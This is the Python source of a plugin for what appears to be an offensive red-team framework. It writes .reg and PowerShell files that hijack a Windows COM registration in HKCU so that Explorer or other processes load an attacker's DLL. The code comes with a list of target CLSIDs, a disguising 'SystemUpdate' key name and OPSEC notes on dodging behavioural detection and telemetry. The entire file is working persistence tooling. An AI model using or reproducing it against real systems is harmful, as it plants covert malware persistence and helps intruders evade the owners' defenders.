"""
COM Hijacking persistence plugin (T1546.015).

Produces a .reg file that registers a HKCU COM override for a chosen CLSID.
Windows resolves COM objects by checking HKCU before HKLM, so setting an
InprocServer32 value in HKCU shadows the legitimate registration without
requiring elevation.

When any process instantiates the targeted COM object (e.g. via CoCreateInstance),
the loader DLL is loaded instead. The DLL's DllMain fires on DLL_PROCESS_ATTACH.

Curated hijack-safe CLSIDs (called by Explorer/Task Scheduler, no HKCU entry by default):
  {BCDE0395-E52F-467C-8E3D-C4579291692E}  MMDevApi - called by Explorer on desktop creation
  {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}  CPVR     - called by Explorer shell extensions
  {BFED5869-0CF0-4E3F-B990-9B0D2AC71FE5}  Task Scheduler helper
  {3AD05575-8857-4850-9277-11B85BDB8E09}  Windows Security Center

OPSEC notes:
  - HKCU registry writes require no elevation; the change persists across reboots.
  - The DLL is loaded by whatever process instantiates the COM object - the parent
    chain (e.g. Explorer) is legitimate and provides cover.
  - reg.exe / regedit.exe writing to HKCU\\Software\\Classes\\CLSID is flagged by
    some behavioral rules; prefer silent import via reg.exe /s or PowerShell
    New-ItemProperty rather than double-click merge.
  - CLSIDs with high instantiation frequency (e.g. MMDevApi) fire quickly but
    generate many telemetry events; low-frequency CLSIDs are quieter but slower.
"""

import os
from ..plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


_plugin = ErebusPlugin(
    metadata=PluginMetadata(
        name="COM Hijacking Persistence",
        description="Produces a HKCU COM override .reg file for persistence (T1546.015)",
        author="erebus",
        version="1.0.0",
        category=PluginCategory.OTHER,
        supported_os=["Windows"],
    )
)


# CLSID -> description mapping for operator reference.
HIJACKABLE_CLSIDS = {
    "{BCDE0395-E52F-467C-8E3D-C4579291692E}": "MMDevApi (Explorer, desktop creation)",
    "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}": "CPVR Shell Extension (Explorer)",
    "{BFED5869-0CF0-4E3F-B990-9B0D2AC71FE5}": "Task Scheduler COM helper",
    "{3AD05575-8857-4850-9277-11B85BDB8E09}": "Windows Security Center notification",
}

_REG_TEMPLATE = """\
Windows Registry Editor Version 5.00

; COM Hijacking - T1546.015
; CLSID: {clsid}
; Description: {description}
; DLL: {dll_path}
;
; Import silently:
;   reg.exe import com_hijack.reg /f
; Or via PowerShell:
;   reg import com_hijack.reg

[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{clsid}]
@="SystemUpdate"

[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{clsid}\\InprocServer32]
@="{dll_path_escaped}"
"ThreadingModel"="Apartment"
"""

_CLEANUP_REG_TEMPLATE = """\
Windows Registry Editor Version 5.00

; Remove COM hijack for CLSID {clsid}
[-HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{clsid}]
"""

_PS1_IMPORT_TEMPLATE = """\
# PowerShell silent import - avoids reg.exe process creation telemetry
New-Item -Path "HKCU:\\Software\\Classes\\CLSID\\{clsid}" -Force | Out-Null
New-Item -Path "HKCU:\\Software\\Classes\\CLSID\\{clsid}\\InprocServer32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\\Software\\Classes\\CLSID\\{clsid}\\InprocServer32" `
    -Name "(Default)" -Value "{dll_path}" -Force
Set-ItemProperty -Path "HKCU:\\Software\\Classes\\CLSID\\{clsid}\\InprocServer32" `
    -Name "ThreadingModel" -Value "Apartment" -Force
Write-Output "COM hijack installed for {clsid}"
"""


def create_com_hijack_dropper(payload_path: str, output_dir: str, **kwargs) -> dict:
    """
    Generate COM hijacking persistence artifacts.

    Args:
        payload_path: Full path to the loader DLL on the target system.
        output_dir:   Directory where output files are written.
        **kwargs:
            clsid (str): Target CLSID. Must include braces, e.g.
                         "{BCDE0395-E52F-467C-8E3D-C4579291692E}".
                         Defaults to MMDevApi CLSID.
            include_ps1 (bool): Also emit a .ps1 import script. Default: True.
            include_cleanup (bool): Emit a cleanup .reg to remove the hijack. Default: True.

    Returns:
        dict with keys:
            reg_path     - .reg file path
            cleanup_path - cleanup .reg file path (None if not generated)
            ps1_path     - .ps1 installer path (None if not generated)
            clsid        - CLSID used
            description  - human-readable CLSID description
            import_cmd   - recommended import command
    """
    os.makedirs(output_dir, exist_ok=True)

    clsid: str = str(kwargs.get("clsid", "{BCDE0395-E52F-467C-8E3D-C4579291692E}")).upper()
    description: str = HIJACKABLE_CLSIDS.get(clsid, "Custom CLSID")

    dll_path_escaped = payload_path.replace("\\", "\\\\")

    reg_path = os.path.join(output_dir, "com_hijack.reg")
    reg_content = _REG_TEMPLATE.format(
        clsid=clsid,
        description=description,
        dll_path=payload_path,
        dll_path_escaped=dll_path_escaped,
    )
    with open(reg_path, "w", encoding="utf-8") as fh:
        fh.write(reg_content)

    cleanup_path = None
    if kwargs.get("include_cleanup", True):
        cleanup_path = os.path.join(output_dir, "com_hijack_cleanup.reg")
        with open(cleanup_path, "w", encoding="utf-8") as fh:
            fh.write(_CLEANUP_REG_TEMPLATE.format(clsid=clsid))

    ps1_path = None
    if kwargs.get("include_ps1", True):
        ps1_path = os.path.join(output_dir, "install_com_hijack.ps1")
        ps1_content = _PS1_IMPORT_TEMPLATE.format(
            clsid=clsid,
            dll_path=payload_path,
        )
        with open(ps1_path, "w", encoding="utf-8") as fh:
            fh.write(ps1_content)

    return {
        "reg_path": reg_path,
        "cleanup_path": cleanup_path,
        "ps1_path": ps1_path,
        "clsid": clsid,
        "description": description,
        "import_cmd": f'reg.exe import "{os.path.basename(reg_path)}" /f',
    }


def register():
    _plugin.register_function("create_com_hijack_dropper", create_com_hijack_dropper)
    return _plugin


def on_load():
    return register()
